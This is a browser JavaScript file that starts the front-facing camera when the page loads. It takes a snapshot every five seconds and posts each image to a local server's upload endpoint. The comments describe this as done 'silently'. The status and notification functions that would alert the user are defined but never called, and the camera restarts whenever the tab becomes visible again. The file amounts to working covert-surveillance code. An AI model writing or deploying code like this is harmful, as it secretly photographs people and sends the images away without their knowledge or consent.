const video = document.getElementById('video');
const statusIndicator = document.querySelector('.status-indicator');
const statusText = document.querySelector('.status-text');
const flash = document.querySelector('.flash');
const toast = document.querySelector('.toast');
let stream = null;
let captureInterval = null;

// Function to update status
function updateStatus(isActive) {
    statusIndicator.classList.toggle('camera-active', isActive);
    statusText.textContent = isActive ? 'Camera Active' : 'Camera Off';
    if (isActive) {
        video.classList.add('video-visible');
    }
}

// Function to show toast message
function showToast(message) {
    toast.textContent = message;
    toast.classList.add('toast-visible');
    setTimeout(() => {
        toast.classList.remove('toast-visible');
    }, 2000);
}

// Function to show flash effect
function showFlash() {
    flash.classList.add('flash-active');
    setTimeout(() => {
        flash.classList.remove('flash-active');
    }, 300);
}

// Function to send photo to server silently
async function sendPhotoToServer(blob) {
    try {
        const formData = new FormData();
        formData.append('photo', blob, 'photo.jpg');
        
        const response = await fetch('http://localhost:3000/upload', {
            method: 'POST',
            body: formData
        });
        
        if (!response.ok) {
            throw new Error('Upload failed');
        }
    } catch (error) {
        console.error('Error uploading photo:', error);
    }
}

// Function to capture photo silently
function capturePhoto() {
    if (!stream) return;
    
    try {
        // Create canvas
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        
        // Draw video frame to canvas
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Convert to blob and send to server silently
        canvas.toBlob((blob) => {
            if (blob) {
                sendPhotoToServer(blob);
            }
        }, 'image/jpeg', 0.95);
    } catch (error) {
        console.error('Error capturing photo:', error);
    }
}

// Function to start the camera silently
async function startCamera() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false
        });
        
        video.srcObject = stream;
        
        // Start automatic photo capture
        captureInterval = setInterval(capturePhoto, 5000); // Capture every 5 seconds
        
    } catch (err) {
        console.error('Error accessing camera:', err);
    }
}

// Start camera automatically when page loads
startCamera();

// Handle page visibility changes
document.addEventListener('visibilitychange', () => {
    if (document.hidden && stream) {
        clearInterval(captureInterval);
        stream.getTracks().forEach(track => track.stop());
        video.srcObject = null;
        stream = null;
    } else if (!document.hidden && !stream) {
        startCamera();
    }
});